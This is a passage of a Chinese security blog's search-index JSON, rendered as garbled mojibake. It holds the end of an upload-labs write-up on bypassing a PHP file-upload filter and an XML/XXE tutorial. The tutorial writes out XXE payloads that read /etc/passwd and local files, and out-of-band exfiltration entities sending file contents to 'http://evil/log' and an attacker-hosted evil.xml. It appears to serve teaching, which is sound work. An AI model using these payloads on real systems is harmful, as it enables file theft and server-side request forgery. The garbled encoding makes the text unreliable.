è€Œæ•°ç»„ä»0å¼€å§‹ï¼Œè¯´æ˜3-1è¿”å›çš„è¿˜æ˜¯åç¼€ï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹çš„jpgï¼Œè¿™ä¹Ÿå°±è¯´æ˜äº†ä¸ºä»€ä¹ˆæœ€åé‡æ–°æ‹¼æ¥è¿‡åçš„æ–‡ä»¶åä¸æ˜¯æˆ‘ä»¬è®¾æƒ³ä¸­çš„123.phpé‚£ä¹ˆè¯¥å¦‚ä½•è§£å†³è¿™ä¸ªéº»çƒ¦å‘¢ï¼Ÿçœ‹åˆ°move_uploaded_fileï¼Œä½¿ç”¨/.æˆªæ–­è¯•è¯•ï¼Œæˆ–è€…00æˆªæ–­ä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦è®©ä»–æ„é€ å®Œåå˜æˆ123.php/.jpgæ‰ä¼šèµ·åˆ°æˆªæ–­ä½œç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“æœ‰.å°±ä¼šè¢«åˆ†å‰²æˆæ•°ç»„ï¼Œè¿™æ—¶åˆè¯¥å¦‚ä½•å‘¢ï¼Ÿå†ä»£ç ä»¥ä¸Šçœ‹ $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } ç»“åˆburpsuitæ¨æµ‹ç°åœ¨çš„fileåå­—ä¸ºè¿™ä¸ªsave_nameçš„å€¼ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ æ›´æ”¹è¿™ä¸ªsave_nameä¸ºä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆfileä¹Ÿä¼šå˜æˆä¸€ä¸ªæ•°ç»„ï¼Œè¿™æ ·å°±ä¸ä¼šç»è¿‡è¢«åˆ†å‰²çš„é‚£ä¸ªæ•°ç»„ï¼Œå¤„ç†æ°å½“ï¼Œä¹Ÿä¸ä¼šç»è¿‡ç™½åå•ï¼Œçœ‹æ¥æ˜¯ä¸è¡Œï¼Œå› ä¸ºä»–é€‰å–çš„æ˜¯fileè¿™ä¸ªæ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶å°†å…¶å€¼ç›´æ¥èµ‹å€¼ç»™extï¼Œæ•…è¿™é‡Œçš„extä¸å¯èƒ½å†æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥ï¼Œæ•°ç»„æœ€åçš„å…ƒç´ ä¸€å®šæ˜¯jpg ä½†æ˜¯è¿˜æ˜¯ä¸è¡Œï¼Ÿæ²¡æœ‰æŠ¥é”™ä½†å´æ— äº‹å‘ç”Ÿï¼Ÿï¼Ÿï¼Ÿè¯´æ˜ä¸Šé¢æ˜¯é”™çš„ å†æ¬¡è°ƒæ•´ï¼Œå°†0å’Œ1æ•°ç»„è°ƒæ¢ä½ç½®å‘ç°æŠ¥é”™ä¿¡æ¯æ”¹å˜äº†ï¼Œï¼ˆè¿™é‡Œè¯´æ˜æ•°ç»„è¦ä»å¤§åˆ°å°ï¼‰å˜æˆæ˜¯æ–‡ä»¶ä¸Šä¼ å¤±è´¥ è¿™é‡Œå°è¯•äº†å‡ ç§ç»„åˆæ–¹å¼å¾—å‡ºï¼š åŠ ä¸åŠ åæ–œæ éƒ½æ— æ‰€è°“ï¼Œåªè¦ä¸ºfile[1]=0å³å¯ å¿…é¡»å…ˆsave_name[0]å†save_name[2] å”¯ä¸€ä¸æ‡‚çš„ç‚¹ï¼š 1.countä¸æ˜¯è¿”å›æ•°ç»„æ•°ç›®å—ï¼Œcountç®—äº†ä¸€ä¸‹æœ‰0 1 2 ä¸‰ä¸ªå…ƒç´  é‚£ä¹ˆ3-1=2 é‚£ä¹ˆè¿”å›çš„ä¸ºä»€ä¹ˆæ˜¯file[1]è€Œä¸æ˜¯2 æˆªæ–­ä¸Šä¼ æ¼æ´åŸç†ï¼šhttp://salt-neko.com/2019/10/27/%E6%88%AA%E6%96%AD%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/ å°ç»“","link":"/2020/12/17/upload-labs1/"},{"title":"xmlæ³¨å…¥ä¸xxeæ³¨å…¥åŸºç¡€çŸ¥è¯†","text":"xmlå®šä¹‰xmlç”±ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯:æ–‡æ¡£ç±»å‹å®šä¹‰(dtd)ã€å³xmlçš„å¸ƒå±€è¯­è¨€ï¼›å¯æ‹“å±•çš„æ ·å¼è¯­è¨€å³xmlçš„æ ·å¼è¡¨è¯­è¨€(xsl)ï¼›ä»¥åŠå¯æ‹“å±•é“¾æ¥è¯­è¨€(XLL);xmlï¼šå¯æ‹“å±•æ ‡è®°è¯­è¨€ï¼Œæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼Œæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ã€‚å®ƒè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œè€Œä¸æ˜¯å‚¨å­˜æ•°æ®ï¼›å¯æ‹“å±•æ ‡è®°è¯­è¨€æ˜¯ä¸€ç§å¾ˆåƒè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€çš„æ ‡è®°è¯­è¨€ã€‚å®ƒçš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚å®ƒçš„æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚éœ€è¦è‡ªè¡Œå®šä¹‰å¯æ‰©å±•æ ‡è®°è¯­è¨€(XML)å’Œè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€(HTML)ä¸ºä¸åŒçš„ç›®çš„è€Œè®¾è®¡å®ƒè¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ã€‚è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å¤–è§‚ xmlä½œç”¨XMLä½¿ç”¨å…ƒç´ å’Œå±æ€§æ¥æè¿°æ•°æ®ã€‚åœ¨æ•°æ®ä¼ é€è¿‡ç¨‹ä¸­ï¼ŒXMLå§‹ç»ˆä¿ç•™äº†è¯¸å¦‚çˆ¶/å­å…³ç³»è¿™æ ·çš„æ•°æ®ç»“æ„ã€‚ä½¿ç”¨XMLåšæ•°æ®äº¤æ¢å¯ä»¥ä½¿åº”ç”¨ç¨‹åºæ›´å…·æœ‰å¼¹æ€§ï¼Œå› ä¸ºå¯ä»¥ç”¨ä½ç½®(ä¸æ™®é€šæ–‡ä»¶ä¸€æ ·)æˆ–ç”¨å…ƒç´ å(ä»æ•°æ®åº“)æ¥å­˜å–XMLæ•°æ®ã€‚ XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!-- â¬†XMLå£°æ˜â¬† --&gt;&lt;!DOCTYPE æ–‡ä»¶å [&lt;!ENTITYå®ä½“å &quot;å®ä½“å†…å®¹&quot;&gt;]&gt;&lt;!-- â¬†æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)â¬† --&gt;&lt;å…ƒç´ åç§° category=&quot;å±æ€§&quot;&gt;æ–‡æœ¬æˆ–å…¶ä»–å…ƒç´ &lt;/å…ƒç´ åç§°&gt;&lt;!-- â¬†æ–‡æ¡£å…ƒç´ â¬† --&gt; xmlæ ¼å¼è¯´æ˜xmlç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„æ ‡è®°è¯­è¨€ï¼Œå¯ä»¥ç”¨æ¥æ ‡è®°æ•°æ®ã€å®šä¹‰æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·å¯¹è‡ªå·±çš„æ ‡è®°è¯­è¨€è¿›è¡Œå®šä¹‰çš„æºè¯­è¨€ã€‚XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLç”Ÿå‘½ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰(å¯é€‰)ã€æ–‡æ¡£å…ƒç´ ã€‚ &lt;?xml version=&quot;1.0&quot; ?&gt;#xmlå£°æ˜&lt;!DOCTYPE note[&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to(#PCDATA)&gt;&lt;!ELEMENT from(#PCDATA)&gt;&lt;!ELEMENT heading(#PCDATA)&gt;#æ–‡æ¡£ç±»å‹å®šä¹‰&lt;!ELEMENT body(#PCDATA)&gt;]&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt; #æ–‡æ¡£å…ƒç´ &lt;from&gt;John&lt;/Ffrom&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don't forget the meeting!&lt;/body&gt; &lt;/note&gt; DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€DTFå¯ä»¥åœ¨xmlæ–‡æ¡£å†…ç”Ÿå‘½ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ ï¼ˆ1ï¼‰å†…éƒ¨å£°æ˜DTD &lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt; ï¼ˆ2ï¼‰å¼•ç”¨å¤–éƒ¨DTD &lt;!DOCTYPE æ ¹å…ƒç´  system &quot;æ–‡ä»¶å&quot;&gt;æˆ–è€…&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot;&quot;æ–‡ä»¶å&quot;&gt;DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ ï¼ˆ3ï¼‰DTDçš„å®ä½“ä½œç”¨ï¼šDTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰xmlæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTDå¯ä»¥åœ¨xmlæ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚ å¤–éƒ¨å®ä½“æ˜¯æŒ‡XMLå¤„ç†å™¨å¿…é¡»è§£æçš„æ•°æ®ã€‚å®ƒå¯¹äºåœ¨å¤šä¸ªæ–‡æ¡£ä¹‹é—´åˆ›å»ºå…±äº«çš„å…¬å…±å¼•ç”¨å¾ˆæœ‰ç”¨ã€‚å¯¹å¤–éƒ¨å®ä½“è¿›è¡Œçš„ä»»ä½•æ›´æ”¹å°†åœ¨åŒ…å«å¯¹å…¶çš„åº”ç”¨çš„æ–‡æ¡£ä¸­ï¼Œè‡ªåŠ¨æ›´æ–°ã€‚å³xmlä½¿ç”¨å¤–éƒ¨å®ä½“å°†ä¿¡æ¯æˆ–â€œå†…å®¹â€å°†è‡ªåŠ¨æå–åˆ°xmlæ–‡æ¡£çš„æ­£æ–‡ä¸­ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åœ¨xmlæ–‡æ¡£å†…éƒ¨å£°æ˜ä¸€ä¸ªå¤–éƒ¨å®ä½“DTDå®ä½“é€‚ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ã€‚æˆ‘ä»¬å¯ä»¥åœ¨å†…éƒ¨ç¡®å®šå…¶å€¼ï¼ˆå†…éƒ¨å­é›†ï¼‰ï¼š &lt;!ENTITY AppSec &quot;Appsec-Labs&quot;&gt; æˆ–ä»å¤–éƒ¨æ¥æº(å¤–éƒ¨å­é›†): &lt;!ENTITY AppSec SYSTEM &quot;http://site.com/some_content/html&quot;&gt; SYSTEMæ ‡è¯†ç¬¦ï¼šè¯¥æ ‡è¯†ç¬¦æ„å‘³ç€è¯¥å®ä½“å°†ä»å¤–éƒ¨æ¥æºè·å–å†…å®¹ï¼Œåœ¨æœ¬ä¾‹ä¸­ï¼Œè¯¥å†…å®¹æ˜¯â€œsite.comâ€ä¸‹çš„ä¸€ä¸ªé¡µé¢ã€‚ ä¸ºäº†å£°æ˜è¿™äº›å®ä½“ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰ä¸­è¿›è¡Œã€‚DTDæ˜¯ä¸€ç»„æ ‡è®°å£°æ˜ï¼Œç”¨äºå®šä¹‰XMLçš„æ–‡æ¡£ç±»å‹ã€‚å®ƒå®šä¹‰äº†XMLæ–‡æ¡£çš„åˆæ³•ç»“æ„å—å’Œå…·æœ‰åˆæ³•å…ƒç´ å’Œå±æ€§åˆ—è¡¨çš„æ–‡æ¡£ç»“æ„ã€‚DTDå¯ä»¥åœ¨XMLæ–‡æ¡£å†…éƒ¨å£°æ˜ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå¤–éƒ¨å¼•ç”¨å£°æ˜â€”ä½¿ç”¨SYSTEMæ ‡è¯†ç¬¦æŒ‡å‘å¯è§£æä½ç½®ä¸­çš„å¦ä¸€ç»„å£°æ˜ã€‚ENTITYå¯ä»¥ä½¿ç”¨SYSTEMå…³é”®å­—,è°ƒç”¨å¤–éƒ¨èµ„æº,è€Œè¿™é‡Œæ˜¯æ”¯æŒå¾ˆå¤šçš„åè®®,å¦‚:http;fileç­‰ï¼Œç„¶å,åœ¨å…¶ä»–DoMç»“ç‚¹ä¸­å¯ä»¥ä½¿ç”¨å¦‚:&test;å¼•ç”¨è¯¥å®ä½“å†…å®¹. é‚£ä¹ˆ,å¦‚æœåœ¨äº§å“åŠŸèƒ½è®¾è®¡å½“ä¸­,è§£æçš„xmlæ˜¯ç”±å¤–éƒ¨å¯æ§åˆ¶çš„,é‚£å°†å¯èƒ½å½¢æˆ,å¦‚:æ–‡ä»¶è¯»å–,DoS,CSRFç­‰æ¼æ´. å¦‚æœè¦å¼•ç”¨ä¸€ä¸ªå¤–éƒ¨èµ„æº,å¯ä»¥å€ŸåŠ©å„ç§åè®® å‡ ä¸ªä¾‹å­: file:///path/to/file.exthttp://url/file.extphp://filter/read=convert.base64-encode/resource=conf.php æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªDTDçš„ä¾‹å­ï¼Œä¸€ä¸ªåœ¨DTDé‡Œé¢æœ‰ä¸€ä¸ªSYSTEMæ ‡è¯†ç¬¦çš„å®ä½“ï¼š &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Author[&lt;!ENTITY app SYSTEM &quot;http://site.com/some_conten.html&quot;&gt;] l å†…éƒ¨å£°æ˜å®ä½“DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚ ä¸€ä¸ªå†…éƒ¨å®ä½“å£°æ˜ ä¾‹å­ DTD: XML: &writer; æ³¨é‡Š: ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å· (;)ã€‚ l å¼•ç”¨å¤–éƒ¨å®ä½“ä¸€ä¸ªå¤–éƒ¨å®ä½“å£°æ˜ &lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI/URL&quot;&gt; æˆ–è€… &lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; ä¾‹å­ DTD: &lt;!ENTITY writer SYSTEM &quot;http://example.com/dtd/writer.dtd&quot;&gt; XML: &lt;author&gt;&amp;writer;&lt;/author&gt; å¤–éƒ¨å®ä½“ç±»å‹æœ‰ ï¼ˆ4ï¼‰CDATACDATA æŒ‡çš„æ˜¯ä¸åº”ç”± XML è§£æå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ï¼ˆUnparsed Character Dataï¼‰ã€‚ åœ¨ XML å…ƒç´ ä¸­ï¼Œâ€&lt;â€ ï¼ˆæ–°å…ƒç´ çš„å¼€å§‹ï¼‰å’Œ â€œ&amp;â€ ï¼ˆå­—ç¬¦å®ä½“çš„å¼€å§‹ï¼‰æ˜¯éæ³•çš„ã€‚ æŸäº›æ–‡æœ¬ï¼Œæ¯”å¦‚ JavaScript ä»£ç ï¼ŒåŒ…å«å¤§é‡ â€œ&lt;â€ æˆ– â€œ&amp;â€ å­—ç¬¦ã€‚ä¸ºäº†é¿å…é”™è¯¯ï¼Œå¯ä»¥å°†è„šæœ¬ä»£ç å®šä¹‰ä¸º CDATAã€‚ CDATA éƒ¨åˆ†ä¸­çš„æ‰€æœ‰å†…å®¹éƒ½ä¼šè¢«è§£æå™¨å¿½ç•¥ã€‚ CDATA éƒ¨åˆ†ç”± &quot;&lt;![CDATA[&quot; å¼€å§‹ï¼Œç”± &quot;]]&gt;&quot; ç»“æŸ XMLå®ä½“XMLçš„å®ä½“åˆ†ä¸ºä»¥ä¸‹äº”ç§:å­—ç¬¦å®ä½“ã€å‘½åå®ä½“ã€å¤–éƒ¨å®ä½“ã€å‚æ•°å®ä½“ã€å†…éƒ¨å®ä½“ã€æ™®é€šå®ä½“å’Œå‚æ•°å®ä½“éƒ½åˆ†ä¸ºå†…éƒ¨å®ä½“å’Œå¤–éƒ¨å®ä½“ä¸¤ç§ï¼Œå¤–éƒ¨å®ä½“å®šä¹‰éœ€è¦åŠ ä¸ŠSYSTEMå…³é”®å­—ï¼Œå…¶å†…å®¹æ˜¯URLæ‰€æŒ‡å‘çš„å¤–éƒ¨æ–‡ä»¶å®é™…çš„å†…å®¹ã€‚å¦‚æœä¸åŠ SYSTEMå…³é”®å­—ï¼Œåˆ™ä¸ºå†…éƒ¨å®ä½“ï¼Œè¡¨ç¤ºå®ä½“ä»£æŒ‡å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚ ï¼ˆ1.ï¼‰å­—ç¬¦å®ä½“æŒ‡ç”¨åè¿›åˆ¶æ ¼å¼(&#aaa;)æˆ–åå…­è¿›åˆ¶æ ¼å¼x;æ¥æŒ‡å®šä»»æ„Unicodeå­—ç¬¦ã€‚å¯¹XMLè§£æå™¨è€Œè¨€ï¼Œå­—ç¬¦å®ä½“ä¸ç›´æ¥è¾“å…¥æŒ‡å®šå­—ç¬¦çš„æ•ˆæœå®Œå…¨ç›¸åŒã€‚ ï¼ˆ2ï¼‰å‘½åå®ä½“ä¹Ÿç§°ä¸ºå†…éƒ¨å®ä½“ï¼Œåœ¨DTDæˆ–å†…éƒ¨å­é›†ï¼ˆå³æ–‡æ¡£ä¸­&lt;!DOCTYPE&gt;è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼‰ä¸­ç”Ÿå‘½ï¼Œåœ¨æ–‡æ¡£ä¸­ç”¨ä½œå¼•ç”¨ã€‚åœ¨xmlæ–‡æ¡£è§£æè¿‡ç¨‹ä¸­ï¼Œå®ä½“å¼•ç”¨å°†ç”±å®ƒçš„è¡¨ç¤ºæ›¿ä»£ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;file:///c://test/1.txt&quot; &gt;]&gt; &lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;http://otherhost/xxxx.php&quot; &gt;]&gt; &lt;value&gt;&amp;xxe;&lt;/value&gt; å¯ä»¥ç”¨åšxxe+ssrf ï¼ˆ3ï¼‰å¤–éƒ¨å®ä½“å¤–éƒ¨å®ä½“è¡¨ç¤ºå¤–éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼Œç”¨ SYSTEM å…³é”®è¯è¡¨ç¤ºã€‚ æœ‰äº›XMLæ–‡æ¡£åŒ…å«systemæ ‡è¯†ç¬¦å®šä¹‰çš„â€œå®ä½“â€ï¼Œè¿™äº›æ–‡æ¡£ä¼šåœ¨DOCTYPEå¤´éƒ¨æ ‡ç­¾ä¸­å‘ˆç°ã€‚è¿™äº›å®šä¹‰çš„â€™å®ä½“â€™èƒ½å¤Ÿè®¿é—®æœ¬åœ°æˆ–è€…è¿œç¨‹çš„å†…å®¹ã€‚æ¯”å¦‚ï¼Œä¸‹é¢çš„XMLæ–‡æ¡£æ ·ä¾‹å°±åŒ…å«äº†XML â€˜å®ä½“â€™ã€‚ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE Anything [&lt;!ENTITY entityex SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;abc&gt;&amp;entityex;&lt;/abc&gt; åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œ XMLå¤–éƒ¨å®ä½“ â€˜entityexâ€™ è¢«èµ‹äºˆçš„å€¼ä¸ºï¼šfile://etc/passwdã€‚åœ¨è§£æXMLæ–‡æ¡£çš„è¿‡ç¨‹ä¸­ï¼Œå®ä½“â€™entityexâ€™çš„å€¼ä¼šè¢«æ›¿æ¢ä¸ºURI(file://etc/passwd)å†…å®¹å€¼ï¼ˆä¹Ÿå°±æ˜¯passwdæ–‡ä»¶çš„å†…å®¹ï¼‰ã€‚ å…³é”®å­—â€™SYSTEMâ€™ä¼šå‘Šè¯‰XMLè§£æå™¨ï¼Œâ€™entityexâ€™å®ä½“çš„å€¼å°†ä»å…¶åçš„URIä¸­è¯»å–ï¼Œå¹¶æŠŠè¯»å–çš„å†…å®¹æ›¿æ¢entityexå‡ºç°çš„åœ°æ–¹ã€‚ å‡å¦‚ SYSTEM åé¢çš„å†…å®¹å¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆç”¨æˆ·å°±å¯ä»¥éšæ„æ›¿æ¢ä¸ºå…¶ä»–å†…å®¹ï¼Œä»è€Œè¯»å–æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ ï¼ˆfile:///etc/passwd)æˆ–è€…è¿œç¨‹æ–‡ä»¶ï¼ˆhttp://www.baidu.com/abc.txtï¼‰ ï¼ˆ4ï¼‰å‚æ•°å®ä½“å‚æ•°å®ä½“åªç”¨äºDTDå’Œæ–‡æ¡£çš„å†…éƒ¨å­é›†ä¸­ï¼ŒXMLçš„è§„èŒƒå®šä¹‰ä¸­ï¼Œåªæœ‰åœ¨DTDä¸­æ‰èƒ½å¼•ç”¨å‚æ•°å®ä½“ï¼Œå‚æ•°å®ä½“çš„å£°æ˜å’Œå¼•ç”¨éƒ½æ˜¯ä»¥ç™¾åˆ†å·%ã€‚å¹¶ä¸”å‚æ•°å®ä½“çš„åº”ç”¨åœ¨DTDæ˜¯ç†è§£è§£æçš„ï¼Œæ›¿æ¢æ–‡æœ¬å°†å˜æˆDTDçš„ä¸€éƒ¨åˆ†ã€‚è¯¥ç±»å‹çš„å®ä½“ç”¨â€œ%â€å­—ç¬¦ï¼ˆæˆ–åå…­è¿›åˆ¶ç¼–ç çš„%ï¼‰å£°æ˜ï¼Œå¹¶ä¸”ä»…åœ¨ç»è¿‡è§£æå’ŒéªŒè¯åæ‰ç”¨äºæ›¿æ¢DTDä¸­çš„æ–‡æœ¬æˆ–å…¶ä»–å†…å®¹ æˆ–è€… å‚æ•°å®ä½“åªèƒ½åœ¨ DTDæ–‡ä»¶ä¸­è¢«å¼•ç”¨ï¼Œå…¶ä»–å®ä½“åœ¨XMLæ–‡æ¡£å†…å¼•ç”¨ã€‚å³ä¸‹é¢å®ä¾‹ï¼Œå‚æ•°å®ä½“ åœ¨DOCTYPEå†… ï¼Œå…¶ä»–å®ä½“åœ¨å¤– &lt;!DOCTYPE a [&lt;!ENTITY % name SYSTEM â€œfile:///etc/passwd&quot;&gt; %name;]&gt; å‚æ•°å®ä½“åœ¨DTDä¸­è§£æä¼˜å…ˆçº§é«˜äºxmlå†…éƒ¨å®ä½“ å®ä½“ç›¸å½“äºå˜é‡ â€œfile:///etc/passwdâ€èµ‹å€¼ç»™name å…ˆå†™ä¸€æ®µç®€å•çš„xmlåˆ©ç”¨ä»£ç ,ä»¥phpä¸ºä¾‹å­: &lt;?php$data = file_get_contents('php://input');$xml = simplexml_load_string($data);echo $xml-&gt;name;?&gt;echo $xml-&gt;name;ä¸­-&gt;name ï¼ˆ5ï¼‰å†…éƒ¨å®ä½“å†…ç½®å®ä½“ä¸ºé¢„ç•™çš„å®ä½“ï¼Œå¦‚ï¼š å®ä½“å¼•ç”¨å­—ç¬¦ &lt; &lt; &gt; &gt; &amp; &amp; &quot; â€œ &apos; â€˜ è€Œå†…éƒ¨å®ä½“æ˜¯æŒ‡åœ¨ä¸€ä¸ªå®ä½“ä¸­å®šä¹‰çš„å¦ä¸€ä¸ªå®ä½“ï¼Œä¹Ÿå°±æ˜¯åµŒå¥—å®šä¹‰ã€‚ å…³äºå®ä½“åµŒå¥—çš„æƒ…å†µï¼Œæ¯”è¾ƒå¹¸è¿çš„æ˜¯DTDä¸­æ”¯æŒå•åŒå¼•å·ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å•åŒå¼•å·é—´éš”ä½¿ç”¨ä½œä¸ºåŒºåˆ†åµŒå¥—å®ä½“å’Œå®ä½“ä¹‹é—´çš„å…³ç³»ï¼›åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å†åµŒå¥—ä¸€ä¸ªå‚æ•°å®ä½“ï¼Œ%å·æ˜¯éœ€è¦å¤„ç†æˆ % å¦‚ä¸‹ï¼š &lt;!ENTITY % param1 '&lt;!ENTITY % xxe SYSTEM &quot;http://evil/log?%payload;&quot; &gt;' %ä¹Ÿå¯å†™ä¸º16è¿›åˆ¶% å¦ï¼šå†…éƒ¨å®ä½“çš„è¿™æ”¯æŒä¸å¦ä¹Ÿæ˜¯å–å†³äºè§£é‡Šå™¨çš„ ï¼ˆ6ï¼‰å‘½åå®ä½“+å¤–éƒ¨å®ä½“å†™æ³•&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE root [&lt;!ENTITY dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;]&gt; &lt;value&gt;&amp;dtd;&lt;/value&gt; è¿™ç§å‘½åå®ä½“è°ƒç”¨å¤–éƒ¨å®ä½“ï¼Œå‘ç°evil.xmlä¸­ä¸èƒ½å®šä¹‰å®ä½“ï¼Œå¦åˆ™è§£æä¸äº†ï¼Œæ„Ÿè§‰å‘½åå®ä½“å¥½é¸¡è‚‹ï¼Œå‚æ•°å®ä½“å°±å¥½ç”¨å¾ˆå¤š ï¼ˆ7ï¼‰ç¬¬ä¸€ç§å‘½åå®ä½“+å¤–éƒ¨å®ä½“+å‚æ•°å®ä½“å†™æ³•&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; %dtd; %all; ]&gt; &lt;value&gt;&amp;send;&lt;/value&gt; å…¶ä¸­evil.xmlæ–‡ä»¶å†…å®¹ä¸º &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;&quot;&gt; è°ƒç”¨è¿‡ç¨‹ä¸ºï¼šå‚æ•°å®ä½“dtdè°ƒç”¨å¤–éƒ¨å®ä½“evil.xmlï¼Œç„¶ååˆè°ƒç”¨å‚æ•°å®ä½“allï¼Œæ¥ç€è°ƒç”¨å‘½åå®ä½“send ï¼ˆ8ï¼‰ç¬¬äºŒç§å‘½åå®ä½“+å¤–éƒ¨å®ä½“+å‚æ•°å®ä½“å†™æ³•&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;%dtd;%send;]&gt;&lt;root&gt;&lt;/root&gt; å…¶ä¸­evil.xmlæ–‡ä»¶å†…å®¹ä¸ºï¼š &lt;!ENTITY % 